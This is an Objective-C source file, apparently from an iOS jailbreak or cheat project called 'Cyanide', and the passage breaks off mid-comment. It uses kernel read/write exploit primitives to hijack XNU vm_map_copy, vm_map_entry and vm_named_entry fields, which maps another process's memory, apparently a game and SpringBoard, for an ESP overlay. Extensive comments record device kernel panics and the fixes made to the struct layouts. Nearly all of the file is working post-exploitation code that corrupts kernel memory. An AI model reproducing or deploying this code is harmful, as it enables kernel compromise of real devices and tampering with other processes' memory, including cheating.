//
//  vm.m
//  Cyanide
//
//  Created by seo on 3/29/26.
//

#import <Foundation/Foundation.h>
#import <pthread.h>
#import <stddef.h>
#import <string.h>
#import "RemoteCall.h"
#import "VM.h"
#import "../../kexploit/krw.h"
#import "../../kexploit/offsets.h"
#import "../../kexploit/kutils.h"
#import "../../kexploit/kexploit_opa334.h"

#define VM_PAGE_PACKED_PTR_BITS                         31
#define VM_PAGE_PACKED_PTR_SHIFT                        6
#define VM_KERNEL_POINTER_SIGNIFICANT_BITS              38
#define PAGE_MASK_K         (PAGE_SIZE - 1ULL)

// Size of a "VM map copies" zone element, as reported by the kernel's own
// bound check in the 2026-09-26 10:39 panic: "object ... of size 72".
// That 72-byte object is a struct vm_map_copy, NOT a vm_map_entry. We only
// READ VME_ENTRY_ZONE_BYTES from it (for the DIAG dump). Nothing is written
// into it any more -- see nextAddr below.
#define VME_ENTRY_ZONE_BYTES 0x48u

// offsetof(struct vm_map_copy, c_u.hdr.links.next), i.e. XNU's own
// vm_map_copy_first_entry() macro. The single real backing entry is reached
// through this pointer, not by treating the copy itself as the entry.
#define VME_COPY_FIRST_ENTRY 0x20u

// The only 32-byte block offset that both contains vme_object_or_delta and
// stays inside a 0x48 element: [0x20, 0x40) <= 0x48.
// offsetof() IS legal here: vme_object_or_delta is a plain union member, not a
// bit-field. It measures 0x3c (the union starts at 0x38, after three uint32_t
// ctx bit-fields), so the field ends exactly at 0x40.
#define VME_BLOCK_HI 0x20u

// The one 32-byte block of struct vm_named_entry we can write, and the only
// one that holds .offset. struct vm_named_entry is
//   lck_mtx_t Lock; union{vm_map_t map; vm_map_copy_t copy;} backing;
//   vm_object_offset_t offset; vm_object_size_t size; vm_object_offset_t
//   data_offset; unsigned access:8, protection:4, is_object:1, internal:1,
//   is_sub_map:1, is_copy:1, is_fully_owned:1;
// = 0x38 bytes on xnu-10063 (Lock is 16 B, backing at 0x10 -- the device
// confirms 0x10 in 7/7 samples because that is where backing.copy reads back
// as a live vm_map_copy). So [0x00,0x20) is strictly inside the element and a
// 32-byte store there cannot trip the zone bound check.
#define VNE_BLOCK_BYTES 0x20u

extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t addr, mach_vm_size_t size);
extern kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);

// Serialize kwrite_zone_element on vm_map_entry. Concurrent remap from ESP
// bone reads raced XNU's non-sleepable RW lock → kernel panic
// "Taking non-sleepable RW lock with preemption enabled".
static pthread_mutex_t g_vmRemapLock = PTHREAD_MUTEX_INITIALIZER;

uint64_t vm_map_get_header(uint64_t vm_map_ptr)
{
    return vm_map_ptr + off_vm_map_hdr;
}

uint64_t vm_map_header_get_first_entry(uint64_t vm_header_ptr)
{
    return kread_ptr(vm_header_ptr + off_vm_map_header_links_next);
}

uint64_t vm_map_entry_get_next_entry(uint64_t vm_entry_ptr)
{
    return kread_ptr(vm_entry_ptr + off_vm_map_entry_links_next);
}

uint32_t vm_header_get_nentries(uint64_t vm_header_ptr)
{
    return kread32(vm_header_ptr + off_vm_map_header_nentries);
}

void vm_entry_get_range(uint64_t vm_entry_ptr, uint64_t *start_address_out, uint64_t *end_address_out)
{
    uint64_t range[2];
    kreadbuf(vm_entry_ptr + 0x10, &range[0], sizeof(range));
    if (start_address_out) *start_address_out = range[0];
    if (end_address_out) *end_address_out = range[1];
}

void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
{
    uint64_t header = vm_map_get_header(vm_map_ptr);
    uint64_t entry = vm_map_header_get_first_entry(header);
    uint64_t numEntries = vm_header_get_nentries(header);

    while (entry != 0 && numEntries > 0) {
        uint64_t start = 0, end = 0;
        vm_entry_get_range(entry, &start, &end);

        BOOL stop = NO;
        itBlock(start, end, entry, &stop);
        if (stop) break;

        entry = vm_map_entry_get_next_entry(entry);
        numEntries--;
    }
}

uint64_t vm_map_find_entry(uint64_t vm_map_ptr, uint64_t address)
{
    // No entry cache. pthread_create / stack COW splits map entries; a cached
    // entry pointer keeps pointing at the pre-COW shared object (zeros) while
    // the write landed on a new anonymous entry — DIAG: create ret=0 but
    // remote_read(out) stayed 0 after shmem clear. Fl0rk/Cyanide walk fresh.
    __block uint64_t found_entry = 0;
    vm_map_iterate_entries(vm_map_ptr, ^(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop) {
        if (address >= start && address < end) {
            found_entry = entry;
            *stop = YES;
        } else if (start > address) {
            // XNU vm_map entries are strictly sorted by start address.
            *stop = YES;
        }
    });
    return found_entry;
}

bool VM_PACKING_IS_BASE_RELATIVE(struct VmPackingParams *p)
{
    return (p->vmpp_bits + p->vmpp_shift) <= VM_KERNEL_POINTER_SIGNIFICANT_BITS;
}

uint64_t vm_unpack_pointer(uint64_t packed, struct VmPackingParams *params)
{
    if (!params->vmpp_base_relative)
    {
        int64_t addr = (int64_t)packed;
        addr <<= (64 - params->vmpp_bits);
        addr >>= (64 - params->vmpp_bits - params->vmpp_shift);
        return (uint64_t)addr;
    }
    if (packed)
    {
        return (packed << params->vmpp_shift) + params->vmpp_base;
    }
    return 0;
}

uint64_t vm_pack_pointer(uint64_t ptr, struct VmPackingParams *params)
{
    if (!params->vmpp_base_relative)
    {
        return ptr >> params->vmpp_shift;
    }
    if (ptr)
    {
        return (ptr - params->vmpp_base) >> params->vmpp_shift;
    }
    return 0;
}

// vme_offset is page-denominated. 31cfbe17 changed this to a pass-through
// "byte" interpretation and that was WRONG. The moment 7c0f1f87 made the
// vm_map_copy hijack actually land, the device kernel panicked immediately --
// which is the falsification condition 31cfbe17 itself predicted. A byte offset
// such as 0x1cc000 interpreted as a page number is astronomically out of range,
// and that is what broke vm_page_insert_internal.
//
// Restored to the symmetric pair the author originally had, which is only now
// reachable because nextAddr is the real backing entry:
//     read : bytes = pages << 12
//     write: pages = bytes >> 12
uint64_t VME_OFFSET(uint64_t vme_offset_raw)
{
    return vme_offset_raw << 12;
}

static struct VMObject vm_get_object_impl(uint64_t map, uint64_t address, uint64_t knownEntry)
{
    struct VMObject result = {0};

    // knownEntry non-zero means the caller already holds the map entry covering
    // `address`, and that is the entire reason for this split.
    //
    // The base walk in DSMemory.m was calling vm_map_remote_page once per map
    // entry, and vm_map_remote_page resolves an address by walking the whole map
    // to find its entry. So the base walk was quadratic, with every step of both
    // walks going through the socket-based kernel read primitive. That was
    // measured as a watchdog kill: MINHDUC was SIGKILLed on the main thread with
    // the stack vm_get_object -> vm_map_find_entry -> vm_map_iterate_entries ->
    // kreadbuf -> early_kread -> set_target_kaddr -> setsockopt.
    uint64_t entryAddr = knownEntry ? knownEntry : vm_map_find_entry(map, address);
    if (!entryAddr) {
        // Rate limited rather than removed. A miss on an address the game has
        // freed is an expected event at a match boundary -- the caller asked for
        // a page that is genuinely gone -- so this used to print once per read
        // for every pointer the stale object graph still pointed at. Four lines
        // is enough to see that it is happening; the count it used to imply is
        // better read off [DS-TLB] remaps, which is one line a second instead of
        // one per failed lookup.
        static uint32_t s_noEntryLogged = 0;
        if (s_noEntryLogged < 4) {
            s_noEntryLogged++;
            NSLog(@"[DS] vm_map_find_entry: no entry covers addr=0x%llx "
                  @"(further ones suppressed)",
                  (unsigned long long)address);
        }
        return result;
    }

    struct vm_map_entry entry = {0};
    kreadbuf(entryAddr, &entry, sizeof(struct vm_map_entry));

    struct VmPackingParams params = {0};
    params.vmpp_base  = VM_MIN_KERNEL_ADDRESS;
    params.vmpp_bits  = VM_PAGE_PACKED_PTR_BITS;
    params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
    params.vmpp_base_relative = VM_PACKING_IS_BASE_RELATIVE(&params) ? 1 : 0;

    uint32_t vme_object = entry.vme_object_or_delta;
    uint64_t vmeObject = vm_unpack_pointer((uint64_t)vme_object, &params);
    if (!is_kaddr_valid(vmeObject)) {
        // Same event as the no-entry and no-object cases further down: a lookup
        // for memory the game has already freed. Rate limited for the same
        // reason -- ungated, this printed once per read for every pointer
        // the stale object graph still pointed at.
        static uint32_t s_badObjLogged = 0;
        if (s_badObjLogged < 4) {
            s_badObjLogged++;
            printf("[DS][%s:%d] invalid VM object 0x%llx for addr=0x%llx "
                   "(raw32=0x%x) -- further ones suppressed\n",
                   __FUNCTION__, __LINE__,
                   (unsigned long long)vmeObject,
                   (unsigned long long)address,
                   vme_object);
        }
        return result;
    }
 
    uint64_t vme_offset_raw = entry.vme_offset;
    uint64_t objectOffs = VME_OFFSET(vme_offset_raw);
 
    uint64_t entryOffs = address - entry.links.start + objectOffs;
 
    result.vmAddress    = address;
    result.address      = vmeObject;
    result.objectOffset = objectOffs;
    result.entryOffset  = entryOffs;
 
    return result;
}

struct VMObject vm_get_object(uint64_t map, uint64_t address)
{
    return vm_get_object_impl(map, address, 0);
}

// Same answer as vm_get_object(map, address) for an address inside an entry the
// caller already holds, without walking the map to find it a second time.
struct VMObject vm_get_object_from_entry(uint64_t entryAddr, uint64_t address)
{
    struct VMObject empty = {0};
    // is_kaddr_valid rather than E_START, which lives in DSMemory.m: this file
    // does not define it, and the entry is about to be kreadbuf'd whole anyway,
    // so validating the pointer itself is the whole of the check.
    if (!is_kaddr_valid(entryAddr)) return empty;
    return vm_get_object_impl(0, address, entryAddr);
}
 

static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object)
{
    struct VMShmem shmem = {0};
    if (!object || !is_kaddr_valid(object->address)) {
        static uint32_t s_noObjAddrLogged = 0;
        if (s_noObjAddrLogged < 4) {
            s_noObjAddrLogged++;
            printf("[DS][%s:%d] invalid VM object 0x%llx -- further ones suppressed\n",
                   __FUNCTION__, __LINE__,
                   object ? (unsigned long long)object->address : 0);
        }
        return shmem;
    }

    // Single-page remap (Cyanide/Fl0rk page cache):
    // named entry is ONE page; vme_offset points at that page in the target
    // object; mach_vm_map uses offset 0. Mapping full-object size + entryOffset
    // caused panic: vm_page_insert_internal offset past object bounds
    // (e.g. off=0x11cc000 into object size=0x4000).
    uint64_t pageObjectOffset = object->entryOffset & ~PAGE_MASK_K;
    uint64_t objectSize = kread64(object->address + off_vm_object_vo_un1_vou_size);
    if (objectSize && pageObjectOffset >= objectSize) {
        static uint32_t s_pastSizeLogged = 0;
        if (s_pastSizeLogged < 4) {
            s_pastSizeLogged++;
            printf("[DS][%s:%d] page offset 0x%llx past object size 0x%llx "
                   "addr=0x%llx -- further ones suppressed\n",
                   __FUNCTION__, __LINE__,
                   (unsigned long long)pageObjectOffset,
                   (unsigned long long)objectSize,
                   (unsigned long long)object->vmAddress);
        }
        return shmem;
    }

    mach_vm_address_t localAddr = 0;
    kern_return_t ret = mach_vm_allocate(mach_task_self_, &localAddr, PAGE_SIZE, VM_FLAGS_ANYWHERE);
    if (ret != KERN_SUCCESS) {
        printf("[DS][%s:%d] mach_vm_allocate failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
        return shmem;
    }

    mach_port_t memoryObject = MACH_PORT_NULL;
    memory_object_size_t entrySize = PAGE_SIZE;
    ret = mach_make_memory_entry_64(mach_task_self_, &entrySize, (memory_object_offset_t)localAddr, VM_PROT_READ | VM_PROT_WRITE, &memoryObject, MACH_PORT_NULL);
    if (ret != KERN_SUCCESS) {
        printf("[DS][%s:%d] mach_make_memory_entry_64 failed: %s\n", __FUNCTION__, __LINE__, mach_error_string(ret));
        mach_vm_deallocate(mach_task_self_, localAddr, PAGE_SIZE);
        return shmem;
    }

    uint64_t shmemNamedEntry = task_get_ipc_port_kobject(task_self(), memoryObject);
    uint64_t shmemVMCopyAddr = kread64(shmemNamedEntry + off_vm_named_entry_backing_copy);
    // XNU declares the backing map entry as the FIRST MEMBER BY VALUE:
    //
    //     struct vm_map_copy {
    //         vm_map_entry_t  vmc_entry;    // <- offset 0, this is what we hijack
    //         vm_map_entry_t *vmc_next;
    //         ...
    //     };
    //
    // so the vm_map_entry to patch lives AT the vm_map_copy address.
    //
    // This used to be:
    //     uint64_t nextAddr = kread64(shmemVMCopyAddr + off_vm_named_entry_size);
    // off_vm_named_entry_size is 0x20 and is offsetof(vm_named_entry, size) -- an
    // offset into vm_named_entry, never into vm_map_copy. Applied to a
    // vm_map_copy pointer, 0x20 lands inside vmc_entry itself: struct
    // vm_map_entry in remote/VM.h puts links at 0x00..0x1F (prev/tnext/start/end,
    // 4 x 8) and store at 0x20, so that read returned store.rbe_left, i.e. heap
    // junk, and handed it to kwrite_zone_element.
    //
    // That is why nothing crashed and nothing worked. The hijack landed on an
    // rbe_left field -- a legacy red-black-tree hook that modern XNU does not
    // walk -- so the named entry kept pointing at its own anonymous page. Writes
    // were invisible to the target and reads returned whatever our private page
    // happened to hold. Measured on device 2026-09-26 10:30 (commit eaf46c86):
    // strlen() executed inside SpringBoard returned 0 three times per attempt,
    // and sb_via_bounce came back 0x0 / 0x3 / 0x4233627577576168 ("hAwUb3B").
    // The object at shmemVMCopyAddr is a struct vm_map_copy, NOT a
    // struct vm_map_entry. Its layout, measured with the compiler against
    // Apple open-source tag xnu-10063.121.3 and confirmed byte-for-byte
    // against 7 device samples on 2026-09-26 11:25 (commit ce1d3b38):
    //
    //   +0x00 u16 type          = 0x0001 = VM_MAP_COPY_ENTRY_LIST   [seen]
    //   +0x08 u64 offset                                                 [seen 0]
    //   +0x10 u64 size          = 0x4000, a 16 KB named entry        [seen]
    //   +0x18    c_u.hdr.links.prev   -> first entry (nentries == 1) [varies]
    //   +0x20    c_u.hdr.links.next   -> vm_map_copy_first_entry()  [varies]
    //   +0x28    c_u.hdr.links.start                             [seen 0]
    //   +0x30    c_u.hdr.links.end                               [seen 0]
    //   +0x38 int nentries      = 1                                  [seen 1]
    //   +0x3c u16 page_shift    = 0x000e -> 1 << 14 == 0x4000        [seen]
    //   +0x40    c_u.hdr.rb_head_store = 0xBAADC0D1 = SKIP_RB_TREE   [seen]
    //
    // 0xBAADC0D1 is a named XNU constant (osfmk/vm/vm_map_store.h:126),
    // not allocator poison. Seeing it pinned at +0x40 is what identified the
    // whole object as a vm_map_copy.
    //
    // The 7 device samples also proved 0x3c is a CONSTANT 0x0001000e across
    // every entry while +0x18/+0x20 changed per entry, i.e. we were writing
    // 4 bytes into cpy_hdr.page_shift -- a live header field -- and calling
    // it MATCH. Hence strlen() kept returning 0 with no crash.
    //
    // The entry to patch is therefore the one the copy points at:
    //     nextAddr = kread64(shmemVMCopyAddr + 0x20)
    // which is XNU's own vm_map_copy_first_entry() macro. offsetof(entry,
    // vme_object_or_delta) stays 0x3c, but it is now applied to the entry
    // and no longer to the copy.
    uint64_t nextAddr = kread64(shmemVMCopyAddr + VME_COPY_FIRST_ENTRY);
    if (!is_kaddr_valid(nextAddr)) {
        printf("[DS][%s:%d] vm_map_copy_first_entry invalid 0x%llx\n", __FUNCTION__, __LINE__,
               (unsigned long long)nextAddr);
        mach_vm_deallocate(mach_task_self(), localAddr, PAGE_SIZE);
        if (MACH_PORT_VALID(memoryObject)) mach_port_deallocate(mach_task_self_, memoryObject);
        return shmem;
    }

    // -------------------------------------------------------------------------
    // The 0x48-byte "VM map copies" element is the vm_map_copy at
    // shmemVMCopyAddr; nextAddr is the separate vm_map_entry it points at.
    // The historical panic quoted below is why writes are limited to one
    // 32-byte block, and it is still the right bound to respect.
    //
    // Proof from the device (panic 2026-09-26 10:39, incident B668A9A9,
    // xnu-10063.122.3 on iPhone13,2 / 21F90):
    //
    //   panic(cpu 5 caller 0xfffffff02745c7b0): zone bound checks:
    //   buffer 0xffffffdf028a8910 of length 32 overflows object
    //   0xffffffdf028a88e0 of size 72 in zone 0xfffffff029304640[VM map copies]
    //
    //   0x8910 - 0x88e0 = 0x30, and 0x30 + 0x20 = 0x50 > 0x48  (overrun by 8)
    //
    // That is exactly kwrite_zone_element's third chunk for len == 80:
    //   chunk 1  dst + 0x00   (32B)
    //   chunk 2  dst + 0x20   (32B)
    //   chunk 3  remaining 16 -> adjust 16 -> writeDst = 64 - 16 = dst + 0x30
    //
    // and sizeof(struct vm_map_entry) is 80 (0x50): links 32 + store 24 +
    // union 8 + vme_alias/vme_offset 8 + bitfield 4 + counts 4.
    //
    // So the premise in the old comment here -- "vmc_entry is the FIRST MEMBER
    // BY VALUE, so the vm_map_entry to patch lives AT the vm_map_copy address"
    // -- is arithmetically impossible: an 80-byte entry cannot be a member of
    // a 72-byte element. Writing sizeof(struct vm_map_entry) bytes is the bug.
    //
    // Hard constraint that follows: every primitive here writes 32 bytes.
    // early_kwrite64() is implemented on top of early_kwrite32bytes()
    // (kexploit/kexploit_opa334.m:502), so even an 8-byte store is widened to
    // 32 and hits the same bound check. On a 72-byte element the only safe
    // block offsets are 0x00 and 0x20 (0x20..0x40 <= 0x48). 0x40 would run to
    // 0x60 and panic again.
    // -------------------------------------------------------------------------

    // Read only 0x48 bytes: that is the whole element. Reading past it is
    // harmless for a zone bounds check but would pull in the next element and
    // make the DIAG below lie.
    struct vm_map_entry entry = {0};
    kreadbuf(nextAddr, &entry, VME_ENTRY_ZONE_BYTES);

    // ---------------------------------------------------------------------
    // BEFORE WRITING: the entry must be the one we think it is.
    //
    // 2026-10-03 10:11, iPhone13,2 / 21F90 / xnu-10063.122.3, incident
    // EDF36373, from the user's own crash report:
    //
    //   panic(cpu 0 caller 0xfffffff025bbb1ac):
    //   pmap_enter_options_internal: attempt to map illegal VA
    //   0xffffff5ff8bfc000 in pmap 0xfffffff027a000e8 @pmap.c:8465
    //   Panicked task ...: 1732 pages, 8 threads: pid 1349: MINHDUC
    //
    // That is a dead kernel, not a dead app: the panic is raised inside
    // vm_map_enter on OUR OWN pmap, and the address is refused because it is
    // not in any user range at all. The only thing in this project that writes
    // into a live vm_map_entry is the hijack two blocks below, a 32-byte store
    // of a packed vm_object pointer into vme_object_or_delta of whatever
    // nextAddr names. A pmap that hands back an unmappable address is a pmap
    // whose tree was written to with the wrong entry, so the entry is checked
    // before it is written to.
    //
    // The check needs no guessing about the layout, but the first version of it
    // guessed wrong and the device said so immediately. It assumed the entry
    // described the address we allocated, [localAddr, localAddr + PAGE_SIZE),
    // because mach_make_memory_entry_64() was handed that range. Every remap was
    // then refused:
    //
    //   [DS] REFUSE hijack entry=0xffffffe0147aa7f0 start=0x0 end=0x4000
    //         want=[0x102fe8000,0x102fec000)
    //   [DS] HIJACK DISABLED after 8 entries that did not describe our own page
    //
    // and nothing drew, because nothing could be read any more. The entry of a
    // vm_map_copy is not an address range in some map, it is the object's own
    // extent: start 0, end the object size. That is what the log prints, on two
    // different entries, both 0x0..0x4000, and it matches how XNU builds it --
    // the copy describes the object, and the memory entry's own offset says
    // where in the object the page lives.
    //
    // So the entry is compared against the copy's own size field, read from the
    // same header this file has been documenting since 03ac21b5:
    //     +0x10 u64 size = 0x4000
    // start must be 0 and end must be exactly that size. Both numbers come from
    // the kernel microseconds ago, and a stale copy, a recycled zone element or
    // a mislocated backing pointer produces anything but that pair.
    //
    // There is no permanent cut-out after N refusals. The first version had one
    // and it cost a whole session of drawing: the wrong guess refused every
    // remap, the cut-out latched, and the ESP had no way to read memory at all.
    // Refusing IS the protection -- a refused remap writes nothing -- so a
    // cut-out on top of it adds no safety and one more way to be wrong. The
    // counter stays to report how long the run is.
    // ---------------------------------------------------------------------
    {
        static int s_hijackBadRun = 0;
        static int s_hijackReported = 0;

        // vm_map_copy.size, the same field the named-entry offset block below
        // reads at shmemVMCopyAddr + 0x10 to find the offset word by value.
        // The entry's end must be exactly it.
        const uint64_t copySize   = kread64(shmemVMCopyAddr + 0x10);
        const uint64_t gotStart   = (uint64_t)entry.links.start;
        const uint64_t gotEnd     = (uint64_t)entry.links.end;

        // 0x4000 is what the device reports for this copy, but do not require
        // that specific number: the check is against the copy's own size, and
        // the copy's own size is what has to be true for the entry to be the
        // one belonging to this copy. Anything the kernel reports for the copy
        // and anything the entry says about itself has to agree, and both are
        // read a moment apart from the same live objects.
        const BOOL copySane = (copySize != 0 && (copySize & (PAGE_SIZE - 1)) == 0 &&
                               copySize <= 0x40000000ULL);
        const BOOL rangeMatches = (gotStart == 0 && gotEnd == copySize);

        if (!copySane || !rangeMatches) {
            s_hijackBadRun++;
            if (!s_hijackReported || s_hijackBadRun == 1 || s_hijackBadRun % 8 == 0) {
                s_hijackReported = 1;
                NSLog(@"[DS] REFUSE hijack entry=0x%llx start=0x%llx end=0x%llx "
                      @"copy=0x%llx copySize=0x%llx run=%d",
                      (unsigned long long)nextAddr,
                      (unsigned long long)gotStart, (unsigned long long)gotEnd,
                      (unsigned long long)shmemVMCopyAddr,
                      (unsigned long long)copySize,
                      s_hijackBadRun);
            }
            mach_vm_deallocate(mach_task_self_, localAddr, PAGE_SIZE);
            if (MACH_PORT_VALID(memoryObject)) {
                mach_port_deallocate(mach_task_self_, memoryObject);
            }
            return shmem;
        }
        if (s_hijackBadRun) {
            // A good one clears the run, so the counter only ever measures
            // consecutive failures.
            s_hijackBadRun = 0;
        }
    }

    // A 72-byte DIAG hex dump used to live here, ungated, on every remap. It cost
    // 9 kreads -- 18 syscalls, since kreadbuf walks 8 bytes per call -- to build a
    // string, and the bytes it read were used by nothing else: `raw` was local to
    // the block. That is 18 of the ~116 syscalls a miss costs, spent on a log line
    // nobody reads twice.
    //
    // The layout question it was answering is answered, in the comments above: the
    // entry to patch is vm_map_copy_first_entry, not the copy itself, and the 7
    // device samples that established it are recorded there. If the layout ever
    // needs measuring again, gate it on a counter rather than restoring it
    // ungated -- a miss is not a rare event, it is what the cache does whenever
    // the working set moves.

    if (entry.vme_kernel_object || entry.is_sub_map) {
        printf("[DS][%s:%d] REJECT submap/kernel-object: addr=0x%llx submap=%d ko=%d\n",
               __FUNCTION__, __LINE__,
               (unsigned long long)object->vmAddress,
               (int)entry.is_sub_map, (int)entry.vme_kernel_object);
        mach_vm_deallocate(mach_task_self_, localAddr, PAGE_SIZE);
        if (MACH_PORT_VALID(memoryObject)) {
            mach_port_deallocate(mach_task_self_, memoryObject);
        }
        return shmem;
    }

    struct VmPackingParams params = {0};
    params.vmpp_base  = VM_MIN_KERNEL_ADDRESS;
    params.vmpp_bits  = VM_PAGE_PACKED_PTR_BITS;
    params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
    params.vmpp_base_relative = VM_PACKING_IS_BASE_RELATIVE(&params) ? 1 : 0;
    uint64_t packedPointer = vm_pack_pointer(object->address, &params);

    uint32_t refCount = kread32(object->address + off_vm_object_ref_count);
    refCount++;
    kwrite32(object->address + off_vm_object_ref_count, refCount);
    BOOL bumpedRef = YES;

    // PATCH GRANULARITY, NOT OFFSET. One variable changed this round: how many
    // bytes go into the element. Offsets are untouched.
    //
    // vme_object_or_delta lives at 0x38, i.e. inside the 0x20..0x40 block, so
    // it is the one field that can be written safely on a 72-byte element.
    // vme_offset at 0x40 would need bytes 0x40..0x48 which is exactly the
    // element end -- legal only for a sub-32-byte store, and we have no such
    // primitive, so it is left alone and measured by the DIAG above instead.
    //
    // FALSIFIABLE PREDICTION
    //   right: no panic; and if the DIAG prints vme_offset=0x0 then the
    //          backing entry already pointed at page 0 of its object, the
    //          hijack was purely the object pointer being wrong, and the
    //          remap should now work (strlen returns the real length,
    //          objc_getClass non-zero).
    //   wrong: no panic but strlen still 0 -> the hijacked entry is not the one
    //          XNU walks; the raw= dump plus vme_offset tells us where to go.
    //   still panics: 0x48 is not the vm_map_copy size after all, and the
    //          bound check is coming from a different writer entirely.
    // Exclusive: concurrent writes raced XNU's non-sleepable RW lock -> panic
    // "Taking non-sleepable RW lock with preemption enabled".
    //
    // The lock is NOT taken here. vm_create_shmem_with_object() takes
    // g_vmRemapLock before calling us, and g_vmRemapLock is a plain
    // PTHREAD_MUTEX_INITIALIZER, i.e. NOT recursive, so a second lock in this
    // body self-deadlocks the calling thread on the very first remap. Those two
    // lines shipped in 9b540f48. Device evidence, 2026-09-26 11:14, app pid 626:
    //   thread 15763 main,    GameTargetModuleBase -> ds_attach
    //                               -> vm_map_remote_page -> here
    //   thread 15769 utility,  SBoardStartOverlay -> init_remote_call -> remote_read
    //                               -> get_shmem_for_page -> vm_map_remote_page -> here
    // both parked in __psynch_mutexwait on mutex 0x102514280, and the stackshot
    // reports it "owned by thread 15763" -- the recursive-lock signature. Because
    // this lock is the first thing on the path, the DIAG below never ran and the
    // whole remap primitive was untested on every build up to 9b540f48.

    // Read-modify-write of the single in-bounds block [0x20, 0x40). Everything
    // outside vme_object_or_delta in that block is preserved byte for byte.
    {
        const uint64_t odOff = offsetof(struct vm_map_entry, vme_object_or_delta);
        uint8_t blk[EARLY_KRW_LENGTH];
        kreadbuf(nextAddr + VME_BLOCK_HI, blk, sizeof(blk));

        const uint32_t newOD = (uint32_t)packedPointer;
        memcpy(blk + (odOff - VME_BLOCK_HI), &newOD, sizeof(newOD));

        early_kwrite32bytes(nextAddr + VME_BLOCK_HI, blk);

        // Readback kept, log dropped. The read is not diagnostic: it is the
        // MISMATCH guard immediately below, which is what stands between a stale
        // map entry and vm_map_enter. Only the NSLog went.
        uint32_t check = 0;
        kreadbuf(nextAddr + odOff, &check, sizeof(check));

        // A write that did not land is a live map entry holding whatever it held
        // before, and the map below goes on to resolve the memory entry through
        // it. There is nothing to undo -- the store either landed or it did not
        // -- so the only safe move is to not use the mapping. This used to log
        // MISMATCH and then mach_vm_map anyway, which is how a wrong object
        // pointer reaches vm_map_enter and comes back as
        // "attempt to map illegal VA" on the panic of 2026-10-03 10:11.
        if (check != newOD) {
            mach_vm_deallocate(mach_task_self_, localAddr, PAGE_SIZE);
            if (MACH_PORT_VALID(memoryObject)) {
                mach_port_deallocate(mach_task_self_, memoryObject);
                memoryObject = MACH_PORT_NULL;
            }
            return shmem;
        }
    }

    // ---------------------------------------------------------------------
    // NAMED-ENTRY OFFSET -- the half of the hijack that was missing.
    //
    // For a memory entry, XNU does NOT take the vm_object offset from the
    // copy's .offset and does NOT take it from the entry's vme_offset. It
    // takes it from vm_named_entry.offset. osfmk/vm/vm_map.c, the named-entry
    // path of mach_vm_map:
    //
    //   4262  if (named_entry->size < (offset + initial_size))
    //             return KERN_INVALID_ARGUMENT;   // caller's offset ONLY
    //   4285  offset = offset + named_entry->offset;
    //   4760  object = vm_named_entry_to_vm_object(named_entry);
    //          -> VME_OBJECT(vm_map_copy_first_entry(named_entry->backing.copy))
    //   ...   vm_map_enter(target_map, &map_addr, map_size, mask, flags,
    //                      object, offset, ...)
    //
    // So the memory entry resolves to exactly two hijacked values:
    //   the object  = VME_OBJECT(copy_entry)      (the write above)
    //   the offset  = named_entry->offset + our file_offset
    //
    // The object half has been landing and MATCHing since 03ac21b5, and the
    // target still could not see a single byte: with offset pinned at 0 every
    // mapping landed on byte 0 of the target's vm_object, so remote_write
    // scribbled on the head of the heap and strlen() on an untouched page
    // returned 0. wantOff in the DIAG above was non-zero on almost every call
    // (0x1808000, 0x1854000, 0x1870000, 0xbf44000, 0x97c000) which is the
    // direct evidence: that value is the offset that was needed and was lost.
    //
    // Located by value, not hardcoded. mach_make_memory_entry_64() built this
    // entry with offset = 0, so .size is the one 8-byte field equal to the
    // copy's .size and .offset is the word right before it. That way the run
    // proves the layout in its own log, and if the layout is not what we
    // think the write is skipped instead of landing somewhere guessed.
    //
    // vme_offset at entry+0x40 is still NOT written and cannot be:
    // sizeof(struct vm_map_entry) is 0x50, every writer here is fixed at 32
    // bytes (early_kwrite32bytes is one setsockopt of EARLY_KRW_LENGTH), and
    // 0x40 + 0x20 = 0x60 > 0x50 would panic on the zone bound check exactly
    // like 9b540f48 did. It does not need to be written -- 4285 shows XNU
    // never reads it on this path.
    // ---------------------------------------------------------------------
    {
        enum { NE_DUMP_BYTES = 0x30 };

        // The read stays because the copySize search below consumes it. What went
        // is the hex rendering of it -- 96 nibble conversions per remap to format
        // a string nobody reads -- and the NSLog below that printed it.
        uint8_t ne[NE_DUMP_BYTES];
        kreadbuf(shmemNamedEntry, ne, sizeof(ne));

        // vm_map_copy.size, written by vm_named_entry_associate_vm_object().
        const uint64_t copySize = kread64(shmemVMCopyAddr + 0x10);

        // 8-byte-aligned fields of vm_named_entry in [0x10, 0x28] are, in
        // order, backing / offset / size / data_offset for the xnu-10063
        // layout. backing is a live kernel pointer, offset and data_offset are
        // 0, size is the copy's size: exactly one match.
        const uint32_t NE_NONE = 0xFFFFFFFFu;
        uint32_t sizeAt = NE_NONE;
        for (uint32_t off = 0x10; off <= 0x28; off += 8) {
            uint64_t v = 0;
            memcpy(&v, ne + off, sizeof(v));
            if (v == copySize) { sizeAt = off; break; }
        }
        const uint32_t offAt = (sizeAt == NE_NONE) ? NE_NONE : (sizeAt - 8);

        // sizeAt and offAt are derived below and still used; only the dump went.
        (void)copySize;

        if (offAt != NE_NONE && offAt + sizeof(uint64_t) <= VNE_BLOCK_BYTES) {
            uint8_t blk[EARLY_KRW_LENGTH];
            kreadbuf(shmemNamedEntry, blk, sizeof(blk));

            const uint64_t newOffset = pageObjectOffset;
            memcpy(blk + offAt, &newOffset, sizeof(newOffset));

            early_kwrite32bytes(shmemNamedEntry, blk);

            // The readback that used to sit here is gone with the log, and that is
            // a deliberate removal rather than an oversight: it existed only to be
            // printed. Nothing ever branched on it -- unlike the
            // vme_object_or_delta readback above, which guards the mapping and so
            // has to stay -- so once the NSLog went the read had no consumer and
            // cost 2 syscalls per remap to produce a number nobody looked at.
            //
            // Worth knowing, since it is now invisible: this kernel write is
            // never verified. If a write to vm_named_entry.offset silently fails,
            // the memory entry keeps pointing at the wrong place in the object and
